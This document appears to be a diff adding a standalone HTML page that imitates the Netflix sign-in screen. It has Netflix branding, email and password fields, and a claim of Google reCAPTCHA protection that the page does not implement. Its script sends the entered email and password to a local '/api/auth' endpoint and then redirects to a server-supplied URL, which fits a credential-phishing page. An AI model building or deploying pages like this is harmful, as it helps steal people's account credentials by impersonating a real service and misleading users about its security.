@@ -1,0 +1,80 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Netflix</title>
+<style>
+  :root { --nf-red: #e50914; --nf-bg-top: #3a0d0d; --nf-bg-bottom: #000; --nf-input-bg: rgba(22, 22, 22, 0.7); --nf-input-border: #808080; }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
+  body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; background: linear-gradient(180deg, var(--nf-bg-top) 0%, var(--nf-bg-bottom) 40%, var(--nf-bg-bottom) 100%); color: #fff; display: flex; flex-direction: column; min-height: 100vh; }
+  header { padding: 24px 4%; border-bottom: 1px solid rgba(255,255,255,0.1); }
+  .logo { color: var(--nf-red); font-weight: 900; font-size: 36px; letter-spacing: -1.5px; font-family: "Bebas Neue", "Arial Black", sans-serif; }
+  main { flex: 1; display: flex; align-items: flex-start; justify-content: center; padding: 60px 20px; }
+  .card { width: 100%; max-width: 450px; padding: 0 20px; }
+  h1 { font-size: 32px; font-weight: 700; margin-bottom: 24px; }
+  .input-group { margin-bottom: 16px; position: relative; }
+  .field { position: relative; }
+  .field input { width: 100%; padding: 24px 16px 8px; background: var(--nf-input-bg); border: 1px solid var(--nf-input-border); border-radius: 4px; color: #fff; font-size: 16px; outline: none; }
+  .field input:focus { border-color: #fff; background: var(--nf-input-bg); }
+  .field label { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); color: #8c8c8c; font-size: 16px; pointer-events: none; transition: all .15s ease; }
+  .field input:focus + label, .field input:not(:placeholder-shown) + label { top: 10px; transform: none; font-size: 11px; }
+  .err { color: #e87c03; font-size: 13px; margin: 12px 0; min-height: 18px; }
+  .btn { width: 100%; padding: 16px; border: none; border-radius: 4px; font-size: 16px; font-weight: 700; cursor: pointer; background: var(--nf-red); color: #fff; }
+  .recaptcha { margin-top: 60px; color: #8c8c8c; font-size: 13px; }
+  @media (max-width: 768px) { header { padding: 16px 20px; } .logo { font-size: 28px; } main { padding: 40px 0; } h1 { font-size: 24px; } .card { padding: 0 24px; } }
+</style>
+</head>
+<body>
+<header><span class="logo">NETFLIX</span></header>
+<main>
+  <div class="card">
+    <h1>Sign In</h1>
+    <form id="login-form" autocomplete="off">
+      <div class="input-group">
+        <div class="field">
+          <input type="email" id="email" placeholder=" " required>
+          <label for="email">Email or mobile number</label>
+        </div>
+      </div>
+      <div class="input-group">
+        <div class="field">
+          <input type="password" id="password" placeholder=" " required>
+          <label for="password">Password</label>
+        </div>
+      </div>
+      <div class="err" id="err"></div>
+      <button type="submit" class="btn">Sign In</button>
+    </form>
+    <p class="recaptcha">This page is protected by Google reCAPTCHA to ensure you're not a bot.</p>
+  </div>
+</main>
+<script>
+  const form = document.getElementById('login-form');
+  const err = document.getElementById('err');
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    err.textContent = '';
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value;
+    if (!email || !password) { err.textContent = 'Please enter a valid email and password.'; return; }
+    const btn = form.querySelector('button'); btn.textContent = '...'; btn.disabled = true;
+    try {
+      const r = await fetch('/api/auth', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password, ts: Date.now() })
+      });
+      if (r.ok) {
+        const data = await r.json();
+        window.location.href = data.redirect;
+      } else {
+        err.textContent = 'Incorrect password. Please try again.';
+        btn.textContent = 'Sign In'; btn.disabled = false;
+      }
+    } catch (_) { err.textContent = 'Network error.'; btn.textContent = 'Sign In'; btn.disabled = false; }
+  });
+</script>
+</body>
+</html>
